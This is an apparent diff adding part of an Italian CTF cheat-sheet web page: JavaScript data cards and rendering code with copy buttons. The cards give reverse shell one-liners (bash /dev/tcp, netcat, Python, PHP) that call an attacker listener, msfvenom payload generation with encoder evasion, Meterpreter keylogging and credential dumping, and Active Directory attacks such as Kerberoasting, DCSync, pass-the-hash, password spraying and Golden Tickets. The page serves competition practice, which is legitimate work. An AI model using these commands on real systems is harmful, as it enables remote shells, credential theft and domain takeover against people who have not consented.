+{cat:"ref",type:"howto",t:"Magic bytes (firme file)",d:"Primi byte che identificano il vero tipo di file: utili per riparare header o riconoscere dati annidati.",oplabel:"firme",op:[
+ {o:"89 50 4E 47",d:"PNG (.png)"},
+ {o:"FF D8 FF",d:"JPEG (.jpg)"},
+ {o:"47 49 46 38",d:"GIF (GIF8)"},
+ {o:"25 50 44 46",d:"PDF (%PDF)"},
+ {o:"50 4B 03 04",d:"ZIP / APK / docx / jar (PK..)"},
+ {o:"52 61 72 21",d:"RAR (Rar!)"},
+ {o:"1F 8B",d:"GZIP (.gz)"},
+ {o:"42 5A 68",d:"BZIP2 (BZh)"},
+ {o:"37 7A BC AF",d:"7-Zip"},
+ {o:"7F 45 4C 46",d:"ELF (eseguibile Linux)"},
+ {o:"4D 5A",d:"PE/EXE (MZ, Windows)"},
+ {o:"49 44 33",d:"MP3 (ID3)"},
+ {o:"52 49 46 46",d:"WAV/AVI (RIFF)"},
+ {o:"CA FE BA BE",d:"class Java"}
+],tags:["magic-bytes","firme","file","forensics","riferimento"]},
+{cat:"ref",type:"howto",t:"Porte → servizio",d:"Porte comuni e cosa girano: orienta il recon dopo nmap.",oplabel:"porte",op:[
+ {o:"21",d:"FTP"},{o:"22",d:"SSH"},{o:"23",d:"Telnet"},{o:"25",d:"SMTP (mail)"},
+ {o:"53",d:"DNS"},{o:"80",d:"HTTP"},{o:"110",d:"POP3"},{o:"139/445",d:"SMB (Windows share)"},
+ {o:"143",d:"IMAP"},{o:"389",d:"LDAP"},{o:"443",d:"HTTPS"},{o:"587",d:"SMTP submission"},
+ {o:"1433",d:"MSSQL"},{o:"3306",d:"MySQL"},{o:"3389",d:"RDP (desktop remoto)"},
+ {o:"5432",d:"PostgreSQL"},{o:"5900",d:"VNC"},{o:"6379",d:"Redis"},{o:"8080",d:"HTTP alt / proxy"},
+ {o:"27017",d:"MongoDB"}
+],tags:["porte","ports","servizi","recon","riferimento"]},
+{cat:"ref",type:"howto",t:"hashcat: modalità (-m) frequenti",d:"Il numero -m da passare a hashcat per i tipi di hash più comuni in CTF.",oplabel:"modalità",op:[
+ {o:"0",d:"MD5"},{o:"100",d:"SHA1"},{o:"1400",d:"SHA256"},{o:"1700",d:"SHA512"},
+ {o:"500",d:"md5crypt ($1$)"},{o:"1800",d:"sha512crypt ($6$, /etc/shadow)"},
+ {o:"3200",d:"bcrypt ($2a$/$2y$)"},{o:"1000",d:"NTLM"},{o:"5600",d:"NetNTLMv2 (Responder)"},
+ {o:"13100",d:"Kerberos TGS (kerberoast)"},{o:"18200",d:"Kerberos AS-REP"},
+ {o:"22000",d:"WPA-PBKDF2 (handshake WiFi)"},{o:"2500",d:"WPA vecchio formato"},
+ {o:"16800",d:"WPA PMKID"},{o:"400",d:"phpass (WordPress/Joomla)"}
+],tags:["hashcat","modalita","hash","riferimento"]},
+{cat:"ref",type:"howto",t:"Reverse shell: one-liner",d:"Da eseguire sul target per riavere una shell sul tuo listener (nc -lvnp 4444). Sostituisci IP e PORT.",oplabel:"one-liner",op:[
+ {o:"bash -i >& /dev/tcp/IP/PORT 0>&1",d:"bash (il più usato)"},
+ {o:"sh -i >& /dev/tcp/IP/PORT 0>&1",d:"sh generico"},
+ {o:"nc -e /bin/sh IP PORT",d:"netcat con -e (se supportato)"},
+ {o:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f",d:"nc senza -e"},
+ {o:"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",d:"Python"},
+ {o:"php -r '$s=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",d:"PHP"}
+],tags:["reverse-shell","shell","payload","riferimento"]},
+
+/* ============ KALI & TOOL ============ */
+{cat:"kali",type:"howto",t:"Nota: tool offensivi",d:"Questi strumenti (Kali) servono soprattutto per challenge stile 'macchina/boot2root' e AD. In una CTF Jeopardy CINI contano meno di crypto/web/pwn/rev, ma è bene averli pronti.",tags:["kali","tools","nota"]},
+{cat:"kali",type:"cmd",t:"searchsploit (exploit-db offline)",d:"Cerca exploit pubblici per un software/versione nel database locale di Kali.",cmd:"searchsploit apache 2.4",op:[
+ {o:"(termine)",d:"cerca per nome/versione"},
+ {o:"-x",d:"mostra l'exploit",e:"searchsploit -x 12345"},
+ {o:"-m",d:"copia l'exploit nella cwd",e:"searchsploit -m 12345"},
+ {o:"-w",d:"mostra l'URL su exploit-db"},
+ {o:"--nmap",d:"cerca a partire da un output nmap XML"}
+],tags:["searchsploit","exploit-db","kali"]},
+{cat:"kali",type:"cmd",t:"Metasploit (msfconsole)",d:"Framework di exploitation: cerca, configura e lancia moduli. -q avvia senza banner.",cmd:"msfconsole -q",op:[
+ {o:"search",d:"cerca un modulo con filtri",e:"search type:exploit platform:windows smb"},
+ {o:"search cve:",d:"cerca per CVE",e:"search cve:2021-34527"},
+ {o:"info",d:"dettagli e opzioni di un modulo",e:"info exploit/windows/smb/ms17_010_eternalblue"},
+ {o:"use",d:"seleziona un modulo (anche per indice dalla search)",e:"use 0"},
+ {o:"show options",d:"parametri richiesti del modulo"},
+ {o:"show payloads",d:"payload compatibili col modulo"},
+ {o:"show targets",d:"target/versioni supportati"},
+ {o:"set / setg",d:"imposta un parametro (setg = globale)",e:"set RHOSTS 10.0.0.5"},
+ {o:"set PAYLOAD",d:"scegli il payload",e:"set PAYLOAD windows/x64/meterpreter/reverse_tcp"},
+ {o:"set LHOST/LPORT",d:"IP e porta della callback"},
+ {o:"check",d:"verifica se il target è vulnerabile senza sfruttarlo"},
+ {o:"exploit / run",d:"lancia l'attacco"},
+ {o:"exploit -j -z",d:"in background, senza interagire subito"},
+ {o:"sessions -l",d:"elenca le sessioni aperte"},
+ {o:"sessions -i",d:"interagisci con una sessione",e:"sessions -i 1"},
+ {o:"sessions -u",d:"aggiorna una shell a meterpreter",e:"sessions -u 1"},
+ {o:"resource",d:"esegui comandi da file (.rc)"}
+],tags:["metasploit","msfconsole","kali","exploit"]},
+{cat:"kali",type:"cmd",t:"Metasploit: multi/handler (cattura shell)",d:"Ricevi la connessione di un payload generato con msfvenom (o di un'altra reverse shell meterpreter).",cmd:"msfconsole -q -x 'use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'",op:[
+ {o:"use multi/handler",d:"il modulo che ascolta"},
+ {o:"set PAYLOAD",d:"DEVE combaciare col payload di msfvenom"},
+ {o:"set LHOST/LPORT",d:"interfaccia e porta d'ascolto"},
+ {o:"exploit -j",d:"ascolta in background (più sessioni)"},
+ {o:"-x 'cmd;cmd'",d:"esegue comandi all'avvio (handler al volo)"}
+],tags:["metasploit","handler","shell","msfvenom","kali"]},
+{cat:"kali",type:"cmd",t:"Meterpreter: comandi essenziali",d:"La shell avanzata di Metasploit. Comandi più utili una volta dentro una sessione.",cmd:"meterpreter > sysinfo",op:[
+ {o:"sysinfo / getuid",d:"info sistema / utente corrente"},
+ {o:"getprivs",d:"privilegi del token corrente"},
+ {o:"shell",d:"passa a una shell di sistema (exit per tornare)"},
+ {o:"background",d:"metti la sessione in background"},
+ {o:"ps / migrate",d:"processi / migra in un altro processo",e:"migrate 1234"},
+ {o:"getsystem",d:"tenta privesc a SYSTEM"},
+ {o:"hashdump",d:"dump degli hash degli account locali"},
+ {o:"load kiwi",d:"carica Mimikatz dentro meterpreter"},
+ {o:"creds_all",d:"(kiwi) dump credenziali in memoria"},
+ {o:"download / upload",d:"trasferisci file",e:"download C:\\\\flag.txt"},
+ {o:"screenshot / keyscan_start",d:"schermata / keylogger"},
+ {o:"portfwd add",d:"port forwarding",e:"portfwd add -l 3389 -p 3389 -r 10.0.0.9"},
+ {o:"run autoroute -s",d:"aggiungi rotta per pivotare nella rete interna"}
+],tags:["meterpreter","metasploit","post","kali"]},
+{cat:"kali",type:"cmd",t:"Metasploit: post-exploitation",d:"Moduli da lanciare DOPO aver ottenuto una sessione (privesc, raccolta, pivot).",cmd:"run post/multi/recon/local_exploit_suggester",op:[
+ {o:"local_exploit_suggester",d:"suggerisce exploit di privesc locali per la sessione"},
+ {o:"post/windows/gather/hashdump",d:"hash degli account Windows"},
+ {o:"post/windows/gather/enum_*",d:"enumera app, share, loot, ecc."},
+ {o:"run autoroute -s 10.0.0.0/24",d:"instrada verso la subnet interna (pivot)"},
+ {o:"use auxiliary/server/socks_proxy",d:"proxy SOCKS per i tool esterni"}
+],tags:["metasploit","post","privesc","pivot","kali"]},
+{cat:"kali",type:"cmd",t:"msfvenom (genera payload)",d:"Crea payload/shellcode (reverse shell, eseguibili) per vari formati e architetture.",cmd:"msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o sh.elf",op:[
+ {o:"-p",d:"payload da generare",e:"-p windows/x64/meterpreter/reverse_tcp"},
+ {o:"LHOST/LPORT",d:"IP e porta della callback"},
+ {o:"-f",d:"formato di output",e:"-f elf | exe | raw | python | war"},
+ {o:"-o",d:"file di output"},
+ {o:"-e",d:"encoder (evasione)",e:"-e x86/shikata_ga_nai"},
+ {o:"-b",d:"bad chars da evitare",e:"-b '\\x00\\x0a'"},
+ {o:"-a",d:"architettura",e:"-a x64"}
+],tags:["msfvenom","payload","shellcode","kali"]},
+{cat:"kali",type:"cmd",t:"netexec / crackmapexec (SMB/AD)",d:"Enumera ed esegue azioni su host SMB/WinRM/MSSQL in massa; verifica credenziali.",cmd:"nxc smb 10.0.0.0/24 -u user -p pass",op:[
+ {o:"smb/winrm/ssh/mssql",d:"protocollo target"},
+ {o:"-u / -p",d:"utente / password (anche liste)"},
+ {o:"-H",d:"pass-the-hash con hash NTLM"},
+ {o:"--shares",d:"elenca le condivisioni"},
+ {o:"--users / --groups",d:"enumera utenti/gruppi"},
+ {o:"-x / -X",d:"esegui comando (cmd / powershell)"}
+],tags:["netexec","crackmapexec","smb","ad","kali"]},
+{cat:"kali",type:"cmd",t:"Impacket: secretsdump",d:"Estrae hash/credenziali da un sistema Windows/DC con credenziali valide.",cmd:"impacket-secretsdump DOMAIN/user:pass@target",tags:["impacket","secretsdump","ad","kali"]},
+{cat:"kali",type:"cmd",t:"Impacket: AS-REP roasting",d:"Trova utenti AD senza pre-auth Kerberos e scarica hash craccabili (hashcat -m 18200).",cmd:"impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip IP",tags:["impacket","asrep","kerberos","ad","kali"]},
+{cat:"kali",type:"cmd",t:"enum4linux-ng (SMB enum)",d:"Enumerazione automatica di share, utenti, policy su host Windows/Samba.",cmd:"enum4linux-ng -A target",tags:["enum4linux","smb","enum","kali"]},
+{cat:"kali",type:"cmd",t:"smbclient / smbmap",d:"Esplora e scarica da condivisioni SMB.",cmd:"smbclient -L //target/ -N; smbmap -H target",op:[
+ {o:"-L //host/",d:"elenca le share (smbclient)"},
+ {o:"-N",d:"niente password (null session)"},
+ {o:"//host/share",d:"connettiti a una share",e:"smbclient //t/public -N"},
+ {o:"-H (smbmap)",d:"target; mostra permessi sulle share"},
+ {o:"-R (smbmap)",d:"elenco ricorsivo dei file"}
+],tags:["smbclient","smbmap","smb","kali"]},
+{cat:"kali",type:"cmd",t:"wpscan (WordPress)",d:"Scanner dedicato a WordPress: plugin/temi vulnerabili, enumerazione utenti, brute.",cmd:"wpscan --url https://target --enumerate u,vp",op:[
+ {o:"--url",d:"sito target"},
+ {o:"--enumerate",d:"cosa enumerare",e:"--enumerate u,vp,vt"},
+ {o:"-U / -P",d:"brute login",e:"-U admin -P rockyou.txt"},
+ {o:"--api-token",d:"token WPVulnDB per i CVE (serve rete)"}
+],tags:["wpscan","wordpress","kali"]},
+{cat:"kali",type:"cmd",t:"Responder (LLMNR/NBT-NS)",d:"Avvelena le risoluzioni di nome nella LAN per catturare hash NetNTLM (poi hashcat -m 5600).",cmd:"responder -I eth0",tags:["responder","netntlm","ad","kali"]},
+{cat:"kali",type:"cmd",t:"evil-winrm (shell Windows)",d:"Shell interattiva su Windows via WinRM con credenziali o hash.",cmd:"evil-winrm -i target -u user -p pass",op:[
+ {o:"-i",d:"IP target"},
+ {o:"-u / -p",d:"utente / password"},
+ {o:"-H",d:"pass-the-hash (hash NTLM)"},
+ {o:"-s / -e",d:"cartelle di script/eseguibili da caricare"}
+],tags:["evil-winrm","winrm","shell","ad","kali"]},
+{cat:"kali",type:"cmd",t:"chisel (pivoting/tunnel)",d:"Crea tunnel TCP/SOCKS per raggiungere reti interne attraverso un host compromesso.",cmd:"chisel server -p 8000 --reverse   # attaccante; client: chisel client ATT:8000 R:socks",tags:["chisel","pivot","tunnel","kali"]},
+
+/* ============ UTILITÀ — altri comandi con opzioni ============ */
+{cat:"util",type:"cmd",t:"git: indagare un repo",d:"Un repo (anche dumpato da .git esposto) nasconde segreti nella storia dei commit.",cmd:"git log --oneline --all; git show <commit>",op:[
+ {o:"log --all --oneline",d:"tutti i commit, compatti"},
+ {o:"show <commit>",d:"mostra le modifiche di un commit"},
+ {o:"diff a b",d:"differenze tra due commit"},
+ {o:"stash list",d:"modifiche messe da parte (spesso dimenticate)"},
+ {o:"reflog",d:"cronologia completa (anche commit 'persi')"},
+ {o:"checkout <commit> -- file",d:"recupera una vecchia versione di un file"},
+ {o:"grep -i pass $(git rev-list --all)",d:"cerca segreti in tutta la storia"}
+],tags:["git","source","secrets","util"]},
+{cat:"util",type:"cmd",t:"ssh: connessione e opzioni",d:"Accesso a host remoti; varie opzioni utili per sfide e tunnel.",cmd:"ssh -i key user@host",op:[
+ {o:"-i",d:"chiave privata",e:"ssh -i id_rsa u@h"},
+ {o:"-p",d:"porta",e:"-p 2222"},
+ {o:"-L",d:"port forward locale",e:"-L 8080:127.0.0.1:80 u@h"},
+ {o:"-D",d:"proxy SOCKS dinamico",e:"-D 1080 u@h"},
+ {o:"-N",d:"solo tunnel, nessun comando"},
+ {o:"-o",d:"opzioni",e:"-o StrictHostKeyChecking=no"}
+],tags:["ssh","tunnel","util"]},
+{cat:"util",type:"cmd",t:"gpg: file e chiavi",d:"Decifra/verifica file protetti con GPG (simmetrici o a chiave).",cmd:"gpg -d file.gpg",op:[
+ {o:"-d",d:"decifra"},
+ {o:"-c",d:"cifra simmetrico (password)"},
+ {o:"--import",d:"importa una chiave",e:"gpg --import key.asc"},
+ {o:"--list-packets",d:"ispeziona la struttura di un file gpg"},
+ {o:"--batch --passphrase",d:"passphrase non interattiva"}
+],tags:["gpg","crypto","util"]},
+{cat:"util",type:"cmd",t:"gdb + pwndbg: comandi chiave",d:"Debugger per pwn/reverse dinamico. Comandi essenziali dentro la sessione.",cmd:"gdb ./chall",op:[
+ {o:"b *0xADDR / b main",d:"breakpoint a indirizzo/funzione"},
+ {o:"r / c",d:"run / continue"},
+ {o:"ni / si",d:"next / step istruzione"},
+ {o:"x/20gx $rsp",d:"esamina memoria (20 giganti hex da rsp)"},
+ {o:"telescope $rsp",d:"stack annotato (pwndbg)"},
+ {o:"vmmap",d:"mappa della memoria (basi, permessi)"},
+ {o:"checksec",d:"protezioni"},
+ {o:"search 'stringa'",d:"cerca in memoria"},
+ {o:"p funzione",d:"indirizzo di un simbolo"}
+],tags:["gdb","pwndbg","debug","util"]},
+{cat:"util",type:"cmd",t:"tmux: più pannelli in gara",d:"Dividi il terminale (exploit + debugger + note) senza perdere sessioni.",cmd:"tmux",op:[
+ {o:"Ctrl-b %",d:"dividi verticale"},
+ {o:"Ctrl-b \"",d:"dividi orizzontale"},
+ {o:"Ctrl-b freccia",d:"sposta tra i pannelli"},
+ {o:"Ctrl-b c",d:"nuova finestra"},
+ {o:"Ctrl-b d",d:"detach (la sessione resta viva)"},
+ {o:"tmux a",d:"riattacca l'ultima sessione"}
+],tags:["tmux","terminale","util"]},
+{cat:"net",type:"cmd",t:"Wireshark: display filter utili",d:"Filtri da incollare nella barra di Wireshark per isolare il traffico interessante.",oplabel:"filtri",op:[
+ {o:"http.request",d:"solo richieste HTTP"},
+ {o:"http.response.code==200",d:"risposte 200"},
+ {o:"ip.addr==10.0.0.5",d:"traffico da/verso un IP"},
+ {o:"tcp.port==21",d:"una porta (es. FTP)"},
+ {o:"dns",d:"solo DNS"},
+ {o:"tcp.flags.syn==1 && tcp.flags.ack==0",d:"SYN (scansioni)"},
+ {o:"frame contains \"flag\"",d:"pacchetti che contengono la stringa"},
+ {o:"tcp.stream eq 3",d:"isola uno stream"},
+ {o:"usb.capdata",d:"dati USB (tastiere HID)"}
+],tags:["wireshark","filtri","pcap","net"]},
+
+/* ============ WINDOWS / ACTIVE DIRECTORY ============ */
+{cat:"winad",type:"howto",t:"Active Directory: come si attacca",d:"AD è il sistema che gestisce utenti/computer di un dominio Windows. Flusso tipico: enumera (utenti, share, SPN) → ottieni delle credenziali (roasting, spray, dump) → le riusi/scali (PtH, delegazioni) → arrivi a Domain Admin / DC.",tags:["ad","windows","metodo","howto"]},
+{cat:"winad",type:"cmd",t:"Enum privesc: winPEAS / linPEAS",d:"Script che automatizzano la ricerca di vie di privilege escalation su una macchina (locale).",cmd:"winpeas.exe    # Linux: ./linpeas.sh",how:"Carica l'eseguibile sul target (es. via SMB/HTTP) e lancialo: evidenzia permessi deboli, credenziali, servizi, task sfruttabili.",tags:["winpeas","linpeas","privesc","windows","ad"]},
+{cat:"winad",type:"cmd",t:"Enum privilegi del token (whoami)",d:"Su Windows, i privilegi del tuo utente dicono la strada di privesc.",cmd:"whoami /priv; whoami /groups",how:"SeImpersonatePrivilege/SeAssignPrimaryToken → famiglia Potato (PrintSpoofer/GodPotato) per SYSTEM. SeBackup → leggi file protetti. SeDebug → dump LSASS.",tags:["whoami","privesc","token","windows"]},
+{cat:"winad",type:"howto",t:"SeImpersonate → SYSTEM (Potato)",d:"Con SeImpersonatePrivilege (tipico di account di servizio/IIS/MSSQL) usi PrintSpoofer o GodPotato per impersonare SYSTEM ed eseguire un comando con i massimi privilegi.",cmd:"PrintSpoofer.exe -i -c cmd    # oppure GodPotato -cmd 'cmd /c whoami'",tags:["printspoofer","godpotato","potato","privesc","windows"]},
+{cat:"winad",type:"cmd",t:"BloodHound: mappa l'AD",d:"Raccoglie dati del dominio e disegna i percorsi verso Domain Admin. Prima raccogli (SharpHound), poi importi nel GUI.",cmd:"bloodhound-python -u user -p pass -d dominio.local -ns DC_IP -c All",op:[
+ {o:"SharpHound.exe -c All",d:"collector da eseguire sul target Windows"},
+ {o:"bloodhound-python",d:"collector remoto da Linux (serve credenziale)"},
+ {o:"-c All",d:"raccogli tutte le informazioni"},
+ {o:"-d / -ns",d:"dominio / IP del DNS (il DC)"},
+ {o:"(GUI)",d:"importa gli .json e usa le query predefinite ('Shortest paths to DA')"}
+],tags:["bloodhound","sharphound","ad","windows","enum"]},
+{cat:"winad",type:"cmd",t:"Kerberoasting",d:"Account con SPN: chiedi il ticket di servizio e craccalo offline (hashcat -m 13100) per ottenere la password.",cmd:"impacket-GetUserSPNs dominio/user:pass -dc-ip IP -request",op:[
+ {o:"-request",d:"richiede i ticket (hash TGS) degli account con SPN"},
+ {o:"-dc-ip",d:"IP del Domain Controller"},
+ {o:"Rubeus kerberoast",d:"equivalente da Windows",e:"Rubeus.exe kerberoast /outfile:h.txt"},
+ {o:"hashcat -m 13100",d:"cracca gli hash ottenuti"}
+],tags:["kerberoast","impacket","rubeus","ad","windows"]},
+{cat:"winad",type:"cmd",t:"AS-REP roasting",d:"Utenti senza pre-auth Kerberos: scarichi hash craccabili offline (hashcat -m 18200).",cmd:"impacket-GetNPUsers dominio/ -usersfile users.txt -no-pass -dc-ip IP",op:[
+ {o:"-no-pass",d:"nessuna credenziale necessaria"},
+ {o:"-usersfile",d:"lista di utenti da provare"},
+ {o:"-request",d:"con credenziali valide, enumera gli utenti vulnerabili"},
+ {o:"hashcat -m 18200",d:"cracca gli hash AS-REP"}
+],tags:["asrep","impacket","kerberos","ad","windows"]},
+{cat:"winad",type:"howto",t:"Pass-the-Hash (PtH)",d:"Con l'hash NTLM di un utente non serve la password in chiaro: lo usi direttamente per autenticarti ai servizi (SMB, WinRM, RDP).",cmd:"nxc smb IP -u user -H NTLMHASH    # evil-winrm -i IP -u user -H HASH",tags:["pass-the-hash","ntlm","ad","windows"]},
+{cat:"winad",type:"cmd",t:"Mimikatz: dump credenziali",d:"Estrae password/hash/ticket dalla memoria di un Windows (serve privilegio elevato).",cmd:"mimikatz # privilege::debug ; sekurlsa::logonpasswords",op:[
+ {o:"privilege::debug",d:"abilita i privilegi necessari (prima cosa)"},
+ {o:"sekurlsa::logonpasswords",d:"credenziali degli utenti loggati (hash/plaintext)"},
+ {o:"sekurlsa::tickets",d:"ticket Kerberos in memoria"},
+ {o:"lsadump::sam",d:"hash degli account locali (SAM)"},
+ {o:"lsadump::dcsync /user:krbtgt",d:"estrae hash dal DC senza toccarlo (serve privilegio)"},
+ {o:"kerberos::ptt ticket.kirbi",d:"inietta un ticket (pass-the-ticket)"}
+],tags:["mimikatz","dump","dcsync","ad","windows"]},
+{cat:"winad",type:"cmd",t:"DCSync (dump dominio)",d:"Con privilegi di replica, estrai gli hash di tutti gli account (incluso krbtgt) direttamente dal Domain Controller.",cmd:"impacket-secretsdump dominio/user:pass@DC_IP",how:"L'hash di krbtgt permette i Golden Ticket. secretsdump fa anche SAM/LSA locali con -sam/-security.",tags:["dcsync","secretsdump","impacket","ad","windows"]},
+{cat:"winad",type:"cmd",t:"Rubeus (Kerberos da Windows)",d:"Toolkit Kerberos: roasting, richiesta/iniezione ticket, overpass-the-hash.",cmd:"Rubeus.exe asreproast    # kerberoast / asktgt / ptt",op:[
+ {o:"asreproast",d:"AS-REP roasting"},
+ {o:"kerberoast",d:"Kerberoasting"},
+ {o:"asktgt /user:/rc4:",d:"richiedi un TGT (overpass-the-hash)"},
+ {o:"ptt /ticket:",d:"inietta un ticket nella sessione"},
+ {o:"dump",d:"estrai i ticket dalla memoria"}
+],tags:["rubeus","kerberos","ad","windows"]},
+{cat:"winad",type:"howto",t:"Golden / Silver ticket",d:"Con l'hash di krbtgt forgi un Golden Ticket (accesso a tutto il dominio come qualsiasi utente). Con l'hash di un account di servizio forgi un Silver Ticket (accesso a quel servizio). Persistenza totale.",tags:["golden-ticket","silver-ticket","kerberos","ad","windows"]},
+{cat:"winad",type:"cmd",t:"Enum utenti AD (RID brute / LDAP)",d:"Ricava la lista utenti del dominio via null session o LDAP.",cmd:"impacket-lookupsid dominio/user:pass@IP    # oppure: ldapsearch -x -H ldap://IP -b 'dc=dom,dc=local'",op:[
+ {o:"lookupsid",d:"RID brute: enumera utenti/gruppi dai SID"},
+ {o:"ldapsearch -x",d:"query LDAP anonima/autenticata"},
+ {o:"-b",d:"base DN del dominio",e:"-b 'dc=corp,dc=local'"},
+ {o:"nxc smb IP --users",d:"elenco utenti via SMB"}
+],tags:["ldap","lookupsid","enum","ad","windows"]},
+{cat:"winad",type:"cmd",t:"Password spraying",d:"Prova UNA password comune su MOLTI utenti (evita il blocco account di un brute classico).",cmd:"nxc smb IP -u users.txt -p 'Primavera2025!' --continue-on-success",how:"Occhio alla lockout policy del dominio: poche prove, password plausibili (stagione+anno, nome azienda).",tags:["password-spray","nxc","ad","windows"]},
+
+];
+
+const CATS = {
+  meta:"🧭 Metodologia & Strategia", web:"🌐 Web", crypto:"🔐 Crypto", pwn:"💥 Pwn",
+  rev:"🔎 Reverse", for:"🧪 Forensics & Stego", net:"📡 Network / Recon / PCAP",
+  osint:"🕵 OSINT", misc:"🎲 Misc", bc:"⛓ Blockchain", mob:"📱 Mobile", kali:"🐉 Kali & Tool", winad:"🪟 Windows / AD", ref:"📑 Riferimenti", util:"🛠 Utilità"
+};
+
+// ===================== RENDER =====================
+const main=document.getElementById('main');
+const qInput=document.getElementById('q');
+const chipsEl=document.getElementById('chips');
+const countEl=document.getElementById('count');
+let activeCat=null, activeType="all";
+
+function esc(s){return (s||"").replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+
+function buildChips(){
+  const all=document.createElement('span');
+  all.className='chip active'; all.textContent='Tutto'; all.dataset.cat="";
+  all.onclick=()=>{activeCat=null;render();updateChips();};
+  chipsEl.appendChild(all);
+  Object.keys(CATS).forEach(c=>{
+    const el=document.createElement('span');
+    el.className='chip'; el.textContent=CATS[c]; el.dataset.cat=c;
+    el.onclick=()=>{activeCat=(activeCat===c?null:c);render();updateChips();};
+    chipsEl.appendChild(el);
+  });
+}
+function updateChips(){
+  [...chipsEl.children].forEach(ch=>{
+    if(ch.dataset.cat==="")ch.classList.toggle('active',!activeCat);
+    else ch.classList.toggle('active',ch.dataset.cat===activeCat);
+  });
+}
+document.getElementById('typefilter').addEventListener('click',e=>{
+  const tf=e.target.closest('.tf'); if(!tf)return;
+  activeType=tf.dataset.tf;
+  [...document.querySelectorAll('.tf')].forEach(x=>x.classList.toggle('active',x===tf));
+  render();
+});
+
+function match(item,terms){
+  const opsTxt=(item.op||[]).map(o=>o.o+' '+o.d+' '+(o.e||'')).join(' ');
+  const hay=(item.t+' '+item.d+' '+(item.cmd||'')+' '+(item.how||'')+' '+opsTxt+' '+(item.tags||[]).join(' ')+' '+item.cat).toLowerCase();
+  return terms.every(t=>hay.includes(t));
+}
+
+function optsHTML(op,label){
+  if(!op||!op.length)return '';
+  const lab=label||'parametri &amp; opzioni';
+  const rows=op.map(o=>`<div class="opt"><span class="of">${esc(o.o)}</span><span class="od">${esc(o.d)}${o.e?`<span class="oe">${esc(o.e)}</span>`:''}</span></div>`).join('');
+  return `<details class="opts"><summary>${lab} (${op.length})</summary>${rows}</details>`;
+}
+
+function cardHTML(it){
+  const tags=(it.tags||[]).map(t=>`<span>${esc(t)}</span>`).join('');
+  const how=it.how?`<p class="how">🧭 ${esc(it.how)}</p>`:'';
+  let cls='card', badge='';
+  if(it.type==='triage'){cls+=' triage'; badge='<span class="badge t">triage</span>';}
+  if(it.type==='howto'){cls+=' howto'; badge='<span class="badge h">concetto</span>';}
+  let cmd='';
+  if(it.cmd){const c=esc(it.cmd);cmd=`<div class="cmdbox"><code>${c}</code><button class="copy" data-cmd="${c.replace(/"/g,'&quot;')}">Copia</button></div>`;}
+  return `<div class="${cls}">
+    <h3>${badge}${esc(it.t)}</h3>
+    <p class="desc">${esc(it.d)}</p>
+    ${cmd}${how}${optsHTML(it.op,it.oplabel)}
+    <div class="tags">${tags}</div></div>`;
+}
+
+function render(){
+  const q=qInput.value.trim().toLowerCase();
+  const terms=q?q.split(/\s+/):[];
+  let items=DATA.filter(it=>
+    (!activeCat||it.cat===activeCat) &&
+    (activeType==="all" || (activeType==="opts" ? (it.op&&it.op.length) : it.type===activeType)) &&
+    (terms.length===0||match(it,terms)));
+  countEl.textContent=items.length+' / '+DATA.length;
+  if(items.length===0){main.innerHTML='<p class="empty">Nessun risultato. Prova un altro termine, o usa <code class="inl">./search.sh</code> sui mirror in vendor/.</p>';return;}
+  let html='';
+  Object.keys(CATS).forEach(cat=>{
+    const group=items.filter(it=>it.cat===cat);
+    if(!group.length)return;
+    html+=`<div class="cat">${CATS[cat]} <span style="color:var(--muted);font-weight:normal">(${group.length})</span></div><div class="cards">`;
+    html+=group.map(cardHTML).join('');
+    html+='</div>';
+  });
+  main.innerHTML=html;
+  main.querySelectorAll('.copy').forEach(b=>{
+    b.onclick=()=>{
+      const txt=b.dataset.cmd;
+      const done=()=>{b.textContent='Copiato!';b.classList.add('ok');setTimeout(()=>{b.textContent='Copia';b.classList.remove('ok');},1200);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(()=>fallback(txt,done));}
+      else fallback(txt,done);
+    };
+  });
+}
+function fallback(txt,cb){const ta=document.createElement('textarea');ta.value=txt;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}ta.remove();cb();}
+
+qInput.addEventListener('input',render);
+document.addEventListener('keydown',e=>{
+  if(e.key==='/'&&document.activeElement!==qInput){e.preventDefault();qInput.focus();}
+  if(e.key==='Escape'){qInput.value='';qInput.blur();render();}
+});
+buildChips();render();
+</script>
+</body>
+</html>
